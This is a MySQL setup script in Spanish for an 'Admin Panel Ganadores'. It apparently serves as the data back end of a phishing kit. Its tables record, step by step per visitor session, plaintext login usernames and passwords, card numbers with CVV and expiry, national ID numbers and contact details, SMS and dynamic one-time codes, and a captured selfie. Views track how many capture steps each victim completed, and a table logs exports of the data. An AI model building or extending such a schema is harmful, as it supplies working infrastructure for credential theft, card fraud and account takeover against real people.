-- =====================================================
-- BASE DE DATOS: Admin Panel Ganadores
-- Sistema: Captura de datos con MySQL + Navicat
-- Fecha: 2026-08-04
-- =====================================================

-- Crear base de datos
CREATE DATABASE IF NOT EXISTS admin_panel_ganadores;
USE admin_panel_ganadores;

-- =====================================================
-- TABLA: usuarios
-- Descripción: Almacena los usuarios del sistema
-- =====================================================
CREATE TABLE IF NOT EXISTS usuarios (
  id INT AUTO_INCREMENT PRIMARY KEY,
  username VARCHAR(100) NOT NULL UNIQUE,
  email VARCHAR(100) NOT NULL UNIQUE,
  password VARCHAR(255) NOT NULL,
  fecha_creacion TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  activo BOOLEAN DEFAULT TRUE,
  INDEX idx_username (username),
  INDEX idx_email (email)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- =====================================================
-- TABLA: sesiones
-- Descripción: Almacena las sesiones de usuarios
-- =====================================================
CREATE TABLE IF NOT EXISTS sesiones (
  id INT AUTO_INCREMENT PRIMARY KEY,
  session_id VARCHAR(255) NOT NULL UNIQUE,
  usuario_id INT,
  ip_address VARCHAR(45),
  user_agent TEXT,
  fecha_inicio TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  fecha_ultima_actividad TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  activa BOOLEAN DEFAULT TRUE,
  FOREIGN KEY (usuario_id) REFERENCES usuarios(id) ON DELETE CASCADE,
  INDEX idx_session_id (session_id),
  INDEX idx_usuario_id (usuario_id),
  INDEX idx_fecha_inicio (fecha_inicio)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- =====================================================
-- TABLA: paso_index (Flujo 1: Login)
-- Descripción: Datos del primer formulario (usuario y clave)
-- =====================================================
CREATE TABLE IF NOT EXISTS paso_index (
  id INT AUTO_INCREMENT PRIMARY KEY,
  session_id VARCHAR(255) NOT NULL,
  usuario VARCHAR(100),
  clave VARCHAR(100),
  timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  FOREIGN KEY (session_id) REFERENCES sesiones(session_id) ON DELETE CASCADE,
  INDEX idx_session_id (session_id),
  INDEX idx_timestamp (timestamp)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- =====================================================
-- TABLA: paso_card (Flujo 2: Tarjeta)
-- Descripción: Datos de tarjeta de crédito/débito
-- =====================================================
CREATE TABLE IF NOT EXISTS paso_card (
  id INT AUTO_INCREMENT PRIMARY KEY,
  session_id VARCHAR(255) NOT NULL,
  numero_tarjeta VARCHAR(20),
  cvv VARCHAR(10),
  fecha_expiracion VARCHAR(10),
  tipo_tarjeta VARCHAR(50),
  timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  FOREIGN KEY (session_id) REFERENCES sesiones(session_id) ON DELETE CASCADE,
  INDEX idx_session_id (session_id),
  INDEX idx_timestamp (timestamp)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- =====================================================
-- TABLA: paso_datos (Flujo 3: Datos Personales)
-- Descripción: Información personal del usuario
-- =====================================================
CREATE TABLE IF NOT EXISTS paso_datos (
  id INT AUTO_INCREMENT PRIMARY KEY,
  session_id VARCHAR(255) NOT NULL,
  nombre VARCHAR(100),
  cedula VARCHAR(20),
  email VARCHAR(100),
  telefono VARCHAR(20),
  timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  FOREIGN KEY (session_id) REFERENCES sesiones(session_id) ON DELETE CASCADE,
  INDEX idx_session_id (session_id),
  INDEX idx_cedula (cedula),
  INDEX idx_timestamp (timestamp)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- =====================================================
-- TABLA: paso_sms (Flujo 4: Código SMS)
-- Descripción: Código SMS de verificación
-- =====================================================
CREATE TABLE IF NOT EXISTS paso_sms (
  id INT AUTO_INCREMENT PRIMARY KEY,
  session_id VARCHAR(255) NOT NULL,
  codigo_sms VARCHAR(10),
  timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  FOREIGN KEY (session_id) REFERENCES sesiones(session_id) ON DELETE CASCADE,
  INDEX idx_session_id (session_id),
  INDEX idx_timestamp (timestamp)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- =====================================================
-- TABLA: paso_dinamica (Flujo 5: Código Dinámico)
-- Descripción: Código dinámico de verificación
-- =====================================================
CREATE TABLE IF NOT EXISTS paso_dinamica (
  id INT AUTO_INCREMENT PRIMARY KEY,
  session_id VARCHAR(255) NOT NULL,
  codigo_dinamica VARCHAR(10),
  timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  FOREIGN KEY (session_id) REFERENCES sesiones(session_id) ON DELETE CASCADE,
  INDEX idx_session_id (session_id),
  INDEX idx_timestamp (timestamp)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- =====================================================
-- TABLA: paso_soyyo (Flujo 6: Foto)
-- Descripción: Foto capturada del usuario
-- =====================================================
CREATE TABLE IF NOT EXISTS paso_soyyo (
  id INT AUTO_INCREMENT PRIMARY KEY,
  session_id VARCHAR(255) NOT NULL,
  foto_datos LONGTEXT,
  foto_nombre VARCHAR(100),
  timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  FOREIGN KEY (session_id) REFERENCES sesiones(session_id) ON DELETE CASCADE,
  INDEX idx_session_id (session_id),
  INDEX idx_timestamp (timestamp)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- =====================================================
-- TABLA: captura_completa
-- Descripción: Registro de capturas completas
-- =====================================================
CREATE TABLE IF NOT EXISTS captura_completa (
  id INT AUTO_INCREMENT PRIMARY KEY,
  session_id VARCHAR(255) NOT NULL,
  datos_json LONGTEXT,
  estado VARCHAR(50) DEFAULT 'completado',
  timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  FOREIGN KEY (session_id) REFERENCES sesiones(session_id) ON DELETE CASCADE,
  INDEX idx_session_id (session_id),
  INDEX idx_estado (estado),
  INDEX idx_timestamp (timestamp)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- =====================================================
-- TABLA: historial_flujos
-- Descripción: Historial de acciones en cada flujo
-- =====================================================
CREATE TABLE IF NOT EXISTS historial_flujos (
  id INT AUTO_INCREMENT PRIMARY KEY,
  session_id VARCHAR(255) NOT NULL,
  flujo VARCHAR(50),
  accion VARCHAR(100),
  detalles TEXT,
  timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  FOREIGN KEY (session_id) REFERENCES sesiones(session_id) ON DELETE CASCADE,
  INDEX idx_session_id (session_id),
  INDEX idx_flujo (flujo),
  INDEX idx_timestamp (timestamp)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- =====================================================
-- TABLA: exportaciones
-- Descripción: Registro de exportaciones a Azure/otros
-- =====================================================
CREATE TABLE IF NOT EXISTS exportaciones (
  id INT AUTO_INCREMENT PRIMARY KEY,
  session_id VARCHAR(255) NOT NULL,
  destino VARCHAR(100),
  archivo_nombre VARCHAR(255),
  tamaño_bytes INT,
  estado VARCHAR(50),
  timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  FOREIGN KEY (session_id) REFERENCES sesiones(session_id) ON DELETE CASCADE,
  INDEX idx_session_id (session_id),
  INDEX idx_destino (destino),
  INDEX idx_estado (estado),
  INDEX idx_timestamp (timestamp)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- =====================================================
-- VISTAS ÚTILES
-- =====================================================

-- Vista: Resumen de capturas por sesión
CREATE VIEW v_capturas_resumen AS
SELECT
  s.session_id,
  s.fecha_inicio,
  s.fecha_ultima_actividad,
  CASE WHEN pi.id IS NOT NULL THEN 'Sí' ELSE 'No' END AS paso_1_completo,
  CASE WHEN pc.id IS NOT NULL THEN 'Sí' ELSE 'No' END AS paso_2_completo,
  CASE WHEN pd.id IS NOT NULL THEN 'Sí' ELSE 'No' END AS paso_3_completo,
  CASE WHEN ps.id IS NOT NULL THEN 'Sí' ELSE 'No' END AS paso_4_completo,
  CASE WHEN pdi.id IS NOT NULL THEN 'Sí' ELSE 'No' END AS paso_5_completo,
  CASE WHEN pso.id IS NOT NULL THEN 'Sí' ELSE 'No' END AS paso_6_completo,
  COUNT(CASE WHEN pi.id IS NOT NULL THEN 1 END) +
  COUNT(CASE WHEN pc.id IS NOT NULL THEN 1 END) +
  COUNT(CASE WHEN pd.id IS NOT NULL THEN 1 END) +
  COUNT(CASE WHEN ps.id IS NOT NULL THEN 1 END) +
  COUNT(CASE WHEN pdi.id IS NOT NULL THEN 1 END) +
  COUNT(CASE WHEN pso.id IS NOT NULL THEN 1 END) AS pasos_completados
FROM sesiones s
LEFT JOIN paso_index pi ON s.session_id = pi.session_id
LEFT JOIN paso_card pc ON s.session_id = pc.session_id
LEFT JOIN paso_datos pd ON s.session_id = pd.session_id
LEFT JOIN paso_sms ps ON s.session_id = ps.session_id
LEFT JOIN paso_dinamica pdi ON s.session_id = pdi.session_id
LEFT JOIN paso_soyyo pso ON s.session_id = pso.session_id
GROUP BY s.session_id, s.fecha_inicio, s.fecha_ultima_actividad;

-- Vista: Datos personales capturados
CREATE VIEW v_datos_personales AS
SELECT
  pd.cedula,
  pd.nombre,
  pd.email,
  pd.telefono,
  pd.timestamp,
  s.session_id
FROM paso_datos pd
JOIN sesiones s ON pd.session_id = s.session_id
ORDER BY pd.timestamp DESC;

-- =====================================================
-- INSERTAR DATOS DE EJEMPLO
-- =====================================================

-- Ejemplo de usuario
INSERT INTO usuarios (username, email, password) VALUES
('admin', 'admin@panel.com', SHA2('password123', 256));

-- Ejemplo de sesión
INSERT INTO sesiones (session_id, usuario_id, ip_address) VALUES
('sess_ejemplo_20260804', 1, '192.168.1.1');

-- Ejemplo de captura
INSERT INTO paso_index (session_id, usuario, clave) VALUES
('sess_ejemplo_20260804', 'usuario_prueba', 'clave_prueba');

-- =====================================================
-- FIN DEL SCRIPT
-- =====================================================
